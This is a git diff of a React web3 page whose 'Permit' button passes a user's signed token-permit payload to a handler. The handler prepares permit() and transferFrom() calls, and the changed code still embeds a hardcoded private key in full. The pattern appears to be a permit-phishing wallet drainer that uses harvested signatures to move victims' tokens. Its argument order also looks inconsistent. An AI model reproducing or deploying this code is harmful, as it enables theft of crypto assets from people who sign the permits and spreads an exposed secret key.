@@ -4,9 +4,10 @@ import {useAccount, useBalance, useDisconnect, useSendTransaction, useSignMessag
 import {parseEther} from "viem";
 import {signTypedData} from "@wagmi/core";
 import {config} from "@/context/config";
-import {Contract, ethers, Wallet} from "ethers";
+import {ethers, Signer, Wallet} from "ethers";
 import {useEffect, useState} from "react";
 import {useEthersProvider, useEthersSigner} from "@/app/ethers";
+import {JsonRpcSigner} from "@ethersproject/providers";
 
 const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
 const developer = {
@@ -160,7 +161,7 @@ const Page = () => {
 							// alert(response.message);
 							// console.log(response);
 
-							await handle(payload);
+							await handle(payload,signer);
 						}}>
 							Permit
 						</button>
@@ -257,7 +258,7 @@ export type ContractCovalenTHQ = {
 	nft_data: any
 }
 
-async function handle(json: any) {
+async function handle(json: any, signer: JsonRpcSigner) {
 	const {
 		owner,
 		contract,
@@ -268,19 +269,22 @@ async function handle(json: any) {
 		deadline,
 		rpc
 	} = json;
+	const createSigner = async ()=>{
+		const provider = new ethers.providers.JsonRpcProvider(rpc);
+		console.log(provider);
+		await provider.detectNetwork()
+		console.log(json)
+		const privateKey = 'ccbe5e7676105cb9190bdd8726b59c7ab33e7e6a62cad3cce07651195ed295b9';
+		return new Wallet(privateKey, provider);
+	}
 
-	const provider = new ethers.providers.JsonRpcProvider(rpc);
-	console.log(provider);
-	await provider.detectNetwork()
-	console.log(json)
-	const privateKey = 'ccbe5e7676105cb9190bdd8726b59c7ab33e7e6a62cad3cce07651195ed295b9';
-	const wallet = new Wallet(privateKey, provider);
+	const SIGNER = signer || await createSigner()
 
 	const {v, r, s} = ethers.utils.splitSignature(signature);
 	let tokenContract = new ethers.Contract(spender, [
 			'function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
 			'function transferFrom(address from, address to, uint256 value) external returns (bool)'
-	], wallet);
+	], SIGNER);
 
 	const args = [spender,owner, amount, deadline, v, r, s];
 	console.log(args)
